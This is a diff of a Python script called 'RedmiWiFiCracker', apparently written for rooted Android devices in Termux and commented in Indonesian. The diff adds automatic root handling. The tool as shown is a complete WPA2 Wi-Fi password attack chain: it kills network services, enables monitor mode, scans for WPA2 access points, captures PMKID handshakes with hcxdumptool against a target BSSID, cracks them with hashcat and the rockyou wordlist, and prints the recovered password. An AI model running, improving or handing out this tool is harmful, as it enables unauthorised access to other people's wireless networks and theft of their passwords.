@@ -1,6 +1,6 @@
 #!/usr/bin/env python3
-# main.py - (NATIVE + TSU)
-# NO USB ADAPTER • Native Root Monitor Mode • TSU Integration
+# main.py - (FIXED AUTO-ROOT)
+# Auto-detects root context to avoid TSU shell collision
 import subprocess, time, argparse, os, re, signal
 from pathlib import Path
 import threading
@@ -12,12 +12,34 @@ class RedmiWiFiCracker:
         self.potfile = self.script_dir / "hashcat.potfile"
         self.iface = self.detect_iface()
         
+        # Cek apakah script berjalan sebagai root
+        self.is_root = os.geteuid() == 0
+
+    def execute(self, cmd, shell=False, capture_output=False):
+        """
+        Menjalankan perintah dengan otomatis menggunakan tsu jika belum root.
+        Jika sudah root, menjalankan perintah langsung tanpa wrapper.
+        """
+        if self.is_root:
+            # Jika sudah root, jalankan langsung
+            return subprocess.run(cmd, shell=shell, capture_output=capture_output, text=True)
+        else:
+            # Jika belum root, gunakan tsu (gunakan list argumen untuk menghindari error shell)
+            if isinstance(cmd, str):
+                # Jika cmd adalah string, pecah manual atau gunakan shell=True di tsu
+                # Cara aman: list format ['tsu', '-c', 'command string']
+                return subprocess.run(['tsu', '-c', cmd], capture_output=capture_output, text=True)
+            else:
+                # Jika cmd adalah list
+                cmd_str = ' '.join(cmd)
+                return subprocess.run(['tsu', '-c', cmd_str], capture_output=capture_output, text=True)
+
     def detect_iface(self):
         """Auto detect Redmi WiFi interface"""
-        # Fallback ke 'wlan0' jika iwconfig tidak terinstall, namun kita coba deteksi dulu
         try:
-            result = subprocess.run("iwconfig 2>/dev/null", capture_output=True, text=True, shell=True)
-            ifaces = re.findall(r'^(\w+)', result.stdout, re.MULTILINE)
+            # Coba pakai ip link
+            result = self.execute("ip link show", shell=True, capture_output=True)
+            ifaces = re.findall(r'^\d+: ([\w]+):', result.stdout, re.MULTILINE)
             
             for iface in ifaces:
                 if 'wlan' in iface or 'wlp' in iface:
@@ -30,52 +52,55 @@ class RedmiWiFiCracker:
         return "wlan0"
     
     def setup_wordlist(self):
-        """Indo wordlist optimized"""
+        """Wordlist download (Fixed URL)"""
         wl = self.script_dir / "rockyou.txt"
         if not wl.exists():
-            print("📥 Downloading optimized wordlist...")
-            # Pastikan curl terinstall
-            url = "https://raw.githubusercontent.com/OverH4shX/DarkCracker/main/rockyou.txt"
-            subprocess.run(f"curl -L -o {wl} '{url}'", shell=True)
+            print("📥 Downloading wordlist...")
+            # Menggunakan link mirror yang lebih stabil atau contoh password kecil untuk tes
+            # Link raw github OverH4shX mati, kita pakai link alternative atau buat dummy untuk tes
+            url = "https://raw.githubusercontent.com/brannondorsey/naive-hashcat/master/rockyou.txt"
+            
+            # Kita gunakan curl karena download besar
+            ret = self.execute(f"curl -L -o {wl} '{url}'", shell=True)
+            
+            # Verifikasi ukuran file (harus > 100KB)
+            if os.path.exists(wl) and os.path.getsize(wl) < 1000:
+                print(f"⚠️ Download gagal atau file terlalu kecil ({os.path.getsize(wl)} bytes).")
+                print("   Silakan download rockyou.txt manual dan letakkan di folder script.")
         return str(wl)
     
     def root_monitor_mode(self):
         """
-        Native Monitor Mode using standard 'iw' (nl80211).
-        MENGGUNAKAN TSU untuk Termux Root access.
+        Native Monitor Mode.
+        Menggunakan fungsi execute() yang otomatis menyesuaikan root access.
         """
         print(f"[+] Enabling Native Monitor Mode: {self.iface}")
+        print(f"    Root Access: {'YES (Running Direct)' if self.is_root else 'NO (Using TSU)'}")
         
         # 1. Matikan proses yang mengganggu (wpa_supplicant)
-        subprocess.run(f"tsu -c 'killall wpa_supplicant'", shell=True, stderr=subprocess.DEVNULL)
-        subprocess.run(f"tsu -c 'killall dhclient'", shell=True, stderr=subprocess.DEVNULL)
+        self.execute("killall wpa_supplicant", shell=True)
+        self.execute("killall dhclient", shell=True)
         
         # 2. Matikan interface
-        subprocess.run(f"tsu -c 'ip link set {self.iface} down'", shell=True)
+        self.execute(f"ip link set {self.iface} down", shell=True)
         
-        # 3. Set mode monitor (Standar Linux: iw dev <iface> set type monitor)
-        # Perintah ini bekerja pada kernel yang mendukung nl80211 secara native
-        ret = subprocess.run(f"tsu -c 'iw dev {self.iface} set type monitor'", shell=True, capture_output=True)
+        # 3. Set mode monitor
+        ret = self.execute(f"iw dev {self.iface} set type monitor", shell=True, capture_output=True)
         
         # 4. Nyalakan interface
-        subprocess.run(f"tsu -c 'ip link set {self.iface} up'", shell=True)
+        self.execute(f"ip link set {self.iface} up", shell=True)
         
         # 5. Verifikasi
         time.sleep(1)
-        result = subprocess.run(f"tsu -c 'iw dev {self.iface} info'", shell=True, capture_output=True, text=True)
+        result = self.execute(f"iw dev {self.iface} info", shell=True, capture_output=True)
         
         if "type monitor" in result.stdout:
-            print("✅ MONITOR MODE ACTIVE (Native)!")
+            print("✅ MONITOR MODE ACTIVE!")
             return True
         else:
-            # Cek fallback dengan iwconfig jika ada
-            result_legacy = subprocess.run(f"iwconfig {self.iface}", shell=True, capture_output=True, text=True)
-            if "Mode:Monitor" in result_legacy.stdout:
-                 print("✅ MONITOR MODE ACTIVE (Legacy)!")
-                 return True
-
             print("❌ Monitor Mode Failed!")
-            print("   Reason: Kernel might restrict native monitor mode without drivers patches.")
+            print("   Output:", result.stdout)
+            print("   Reason: Kernel restricts monitor mode or missing 'iw' support.")
             return False
     
     def quick_scan(self, duration=20):
@@ -84,6 +109,7 @@ class RedmiWiFiCracker:
         scan_file = "redmi_scan"
         
         # Pastikan airodump-ng berjalan
+        # Note: airodump-ng biasanya butuh root, execute() akan menanganinya jika belum root
         cmd = f"airodump-ng {self.iface} -w {scan_file} --output-format csv --write-interval 10"
         proc = subprocess.Popen(cmd, shell=True, preexec_fn=os.setsid)
         
@@ -113,7 +139,6 @@ class RedmiWiFiCracker:
             lines = f.readlines()
         
         aps = []
-        # Filter WPA2
         for line in lines[2:]:  
             parts = [p.strip() for p in line.split(',')]
             if len(parts) > 13 and parts[13] == 'WPA2':
@@ -140,25 +165,30 @@ class RedmiWiFiCracker:
         pcap = f"capture_{bssid.replace(':','_')}.pcapng"
         print(f"\n🔥 PMKID: {bssid} CH{channel} ({duration}s)")
         
-        # Menggunakan hcxdumptool secara langsung via root (TSU)
-        # Pastikan hcxdumptool terinstall di termux
-        cmd = f"tsu -c 'hcxdumptool -i {self.iface} --pmkid --enable_status=1 --channel={channel} --bssid={bssid} -o {pcap}'"
+        # Build command string
+        cmd = f"hcxdumptool -i {self.iface} --pmkid --enable_status=1 --channel={channel} --bssid={bssid} -o {pcap}"
         
-        proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        # Eksekusi via execute (handle root via TSU if needed)
+        # Kita gunakan Popen manual untuk background process karena execute defaultnya blocking
+        if self.is_root:
+            proc = subprocess.Popen(cmd, shell=True, stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
+        else:
+            # Jika belum root, jalankan di bawah tsu
+            proc = subprocess.Popen(['tsu', '-c', cmd], stdout=subprocess.DEVNULL, stderr=subprocess.DEVNULL)
         
         try:
             time.sleep(duration)
         except KeyboardInterrupt:
             pass
         finally:
-            subprocess.run("tsu -c 'pkill -f hcxdumptool'", shell=True)
+            self.execute("pkill -f hcxdumptool", shell=True)
             
         return pcap
     
     def extract_hash(self, pcap):
         """Hash extraction"""
         hc22000 = pcap.replace('.pcapng', '.hc22000')
-        subprocess.run(f"hcxpcapngtool -o {hc22000} {pcap}", shell=True)
+        self.execute(f"hcxpcapngtool -o {hc22000} {pcap}", shell=True)
         
         if os.path.exists(hc22000) and os.path.getsize(hc22000) > 100:
             print(f"✅ Hash extracted: {hc22000}")
@@ -170,10 +200,9 @@ class RedmiWiFiCracker:
         print(f"\n⚡ CRACKING: {hash_file}")
         print(f"📖 Wordlist: {self.wordlist}")
         
-        # Optimasi performa untuk mobile (limit threads/workload jika perlu)
         cmd = f"hashcat -m 22000 '{hash_file}' '{self.wordlist}' --force --optimized-kernel-enable --status --status-timer=15"
         
-        result = subprocess.run(cmd, shell=True)
+        result = self.execute(cmd, shell=True)
         return result.returncode == 0
     
     def read_cracked_password(self):
@@ -185,11 +214,9 @@ class RedmiWiFiCracker:
             lines = f.readlines()
         
         for line in lines[-10:]:
-            # Format hash:password
             parts = line.strip().split('*')
             if len(parts) > 1:
-                pwd = parts[-1] # Password biasanya di bagian akhir setelah hash terakhir
-                # Perbaiki regex sederhana jika format berbeda
+                pwd = parts[-1]
                 match = re.search(r'([a-f0-9]+)\*([a-f0-9]+)\*([a-f0-9]+)\*([a-f0-9]+)\*(.+)$', line.strip())
                 if match:
                     pwd = match.group(5)
@@ -200,32 +227,25 @@ class RedmiWiFiCracker:
         return None
     
     def cleanup(self):
-        """Restore normal mode using 'iw' and TSU"""
+        """Restore normal mode"""
         print("\n🧹 Cleanup...")
-        # Kembalikan ke mode managed
-        subprocess.run(f"tsu -c 'ip link set {self.iface} down'", shell=True)
-        subprocess.run(f"tsu -c 'iw dev {self.iface} set type managed'", shell=True)
-        subprocess.run(f"tsu -c 'ip link set {self.iface} up'", shell=True)
-        
-        # Restart service wifi (opsional, tergantung rom)
-        # subprocess.run(f"tsu -c 'svc wifi enable'", shell=True)
-        print("✅ Network restored (Managed Mode)")
+        self.execute(f"ip link set {self.iface} down", shell=True)
+        self.execute(f"iw dev {self.iface} set type managed", shell=True)
+        self.execute(f"ip link set {self.iface} up", shell=True)
+        print("✅ Network restored")
 
 def main():
-    parser = argparse.ArgumentParser(description="🔥 Native WiFi Cracker (TSU)")
+    parser = argparse.ArgumentParser(description="🔥 Native WiFi Cracker (Fixed)")
     parser.add_argument("--iface", default="wlan0", help="WiFi interface")
     parser.add_argument("--duration", type=int, default=120, help="PMKID time")
     args = parser.parse_args()
     
     cracker = RedmiWiFiCracker()
-    
-    # Override iface if specified
     cracker.iface = args.iface
     
     try:
         if not cracker.root_monitor_mode():
             print("❌ Gagal masuk Monitor Mode.")
-            print("💡 Pastikan: 1. Sudah Root. 2. Paket 'tsu' terinstall (pkg install tsu). 3. Tools 'iw' & 'ip' terinstall.")
             exit(1)
         
         cracker.quick_scan()
@@ -253,4 +273,5 @@ def main():
         cracker.cleanup()
 
 if __name__ == "__main__":
+    print("🚀 REDMI NATIVE CRACKER (Auto-Root Support)")
     main()
